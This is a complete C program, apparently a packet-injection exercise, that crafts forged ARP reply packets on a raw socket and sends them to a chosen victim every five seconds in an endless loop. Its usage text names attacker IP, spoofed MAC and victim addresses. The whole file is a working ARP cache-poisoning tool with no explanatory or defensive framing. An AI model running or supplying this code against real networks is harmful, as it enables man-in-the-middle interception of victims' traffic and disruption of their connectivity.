#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<features.h>
#include<net/if.h>
#include<linux/if_packet.h>
#include<linux/if_ether.h>
#include<errno.h>
#include<sys/ioctl.h>
#include<net/ethernet.h>
#include<net/if_arp.h>
#include<arpa/inet.h>
#include<netinet/in.h>


//#define SRC_ETHER_ADDR	"08:00:27:63:A3:96"
//#define DST_ETHER_ADDR	"08:00:27:BB:04:09"
//#define SRC_IP	"192.168.1.7"
//#define DST_IP	"192.168.1.6"


char *SRC_ETHER_ADDR;
char * DST_ETHER_ADDR;
char * SRC_IP;
char * DST_IP;
char * interface;

typedef struct EthernetHeader{

	unsigned char destination[6];
	unsigned char source[6];
	unsigned short protocol;

}EthernetHeader;

typedef struct ArpHeader{

	unsigned short hardware_type;
	unsigned short protocol_type;
	unsigned char hard_addr_len;
	unsigned char prot_addr_len;
	unsigned short opcode;
	unsigned char source_hardware[6];
	unsigned char source_ip[4];
	unsigned char dest_hardware[6];
	unsigned char dest_ip[4];
}ArpHeader;


int CreateRawSocket(int protocol_to_sniff)
{
	int rawsock;

	if((rawsock = socket(PF_PACKET, SOCK_RAW, htons(protocol_to_sniff)))== -1)
	{
		perror("Error creating raw socket: ");
		exit(-1);
	}

	return rawsock;
}

int BindRawSocketToInterface(char *device, int rawsock, int protocol)
{

	struct sockaddr_ll sll;
	struct ifreq ifr;

	bzero(&sll, sizeof(sll));
	bzero(&ifr, sizeof(ifr));

	/* First Get the Interface Index  */


	strncpy((char *)ifr.ifr_name, device, IFNAMSIZ);
	if((ioctl(rawsock, SIOCGIFINDEX, &ifr)) == -1)
	{
		printf("Error getting Interface index !\n");
		exit(-1);
	}

	/* Bind our raw socket to this interface */

	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifr.ifr_ifindex;
	sll.sll_protocol = htons(protocol);


	if((bind(rawsock, (struct sockaddr *)&sll, sizeof(sll)))== -1)
	{
		perror("Error binding raw socket to interface\n");
		exit(-1);
	}

	return 1;

}


int SendRawPacket(int rawsock, unsigned char *pkt, int pkt_len)
{
	int sent= 0;

	/* A simple write on the socket ..thats all it takes ! */

	if((sent = write(rawsock, pkt, pkt_len)) != pkt_len)
	{
		/* Error */
		printf("Could only send %d bytes of packet of length %d\n", sent, pkt_len);
		return 0;
	}

	return 1;


}

EthernetHeader* CreateEthernetHeader(char *src_mac, char *dst_mac, int protocol)
{
	EthernetHeader  *ethernet_header;


	ethernet_header = (EthernetHeader *)malloc(sizeof(EthernetHeader));

	/* copy the Src mac addr */

	memcpy(ethernet_header->source, (void *)ether_aton(src_mac), 6);

	/* copy the Dst mac addr */

	memcpy(ethernet_header->destination, (void *)ether_aton(dst_mac), 6);

	/* copy the protocol */

	ethernet_header->protocol = htons(protocol);

	/* done ...send the header back */

	return (ethernet_header);
}

ArpHeader *CreateArpHeader(void)
{
	ArpHeader *arp_header;
	in_addr_t temp;

	arp_header = (ArpHeader *)malloc(sizeof(struct ArpHeader));

	/* Fill the ARP header */
	arp_header->hardware_type = htons(ARPHRD_ETHER);
	arp_header->protocol_type = htons(ETHERTYPE_IP);
	arp_header->hard_addr_len = 6;
	arp_header->prot_addr_len = 4;
	arp_header->opcode = htons(ARPOP_REPLY);
	memcpy(arp_header->source_hardware, (void *)ether_aton(SRC_ETHER_ADDR) , 6);
	temp = inet_addr(SRC_IP);
	memcpy(&(arp_header->source_ip), &temp, 4);
	memcpy(arp_header->dest_hardware, (void *) ether_aton(DST_ETHER_ADDR) , 6);
	temp = inet_addr(DST_IP);
	memcpy(&(arp_header->dest_ip), &temp, 4);

	return arp_header;
}


void error()
{
	printf("Packet_injection2 [interface][Attacker IP][Spoof MAC Address][Victim MAC Address][Victim IP] \n");
	exit(1);
}

/* argv[1] is the device e.g. eth0    */

main(int argc, char **argv)
{

	int raw;
	unsigned char *packet;
	EthernetHeader *ethernet_header;
	ArpHeader *arp_header;
	int pkt_len;

	if(argv[1] == NULL)
	{
			error();
	}

	if(argv[2] == NULL)
	{
			error();
	}

	if(argv[3] == NULL)
	{
			error();
	}
	if(argv[4] == NULL)
	{
				error();
	}
	if(argv[5] == NULL)
	{
				error();
	}

	interface = argv[1];
	SRC_IP = argv[2];
	SRC_ETHER_ADDR = argv[3];
	DST_ETHER_ADDR = argv[4];
	DST_IP = argv[5];



	/* Create the raw socket */

	raw = CreateRawSocket(ETH_P_ALL);

	/* Bind raw socket to interface */

	BindRawSocketToInterface(argv[1], raw, ETH_P_ALL);

	/* create Ethernet header */

	ethernet_header = CreateEthernetHeader(SRC_ETHER_ADDR, DST_ETHER_ADDR, ETHERTYPE_ARP);

	/* Create ARP header */

	arp_header = CreateArpHeader();

	/* Find packet length  */

	pkt_len = sizeof(EthernetHeader) + sizeof(ArpHeader);

	/* Allocate memory to packet */

	packet = (unsigned char *)malloc(pkt_len);

	/* Copy the Ethernet header first */

	memcpy(packet, ethernet_header, sizeof(EthernetHeader));

	/* Copy the ARP header - but after the ethernet header */

	memcpy((packet + sizeof(EthernetHeader)), arp_header, sizeof(ArpHeader));

	/* Send the packet out ! */

	while (1)
	{
	if(!SendRawPacket(raw, packet, pkt_len))
	{
		perror("Error sending packet");
	}
	else
		printf("Packet sent successfully\n");

	sleep(5);
	}

	/* Free the memory back to the heavenly heap */

	free(ethernet_header);
	free(arp_header);
	free(packet);

	close(raw);

	return 0;
}

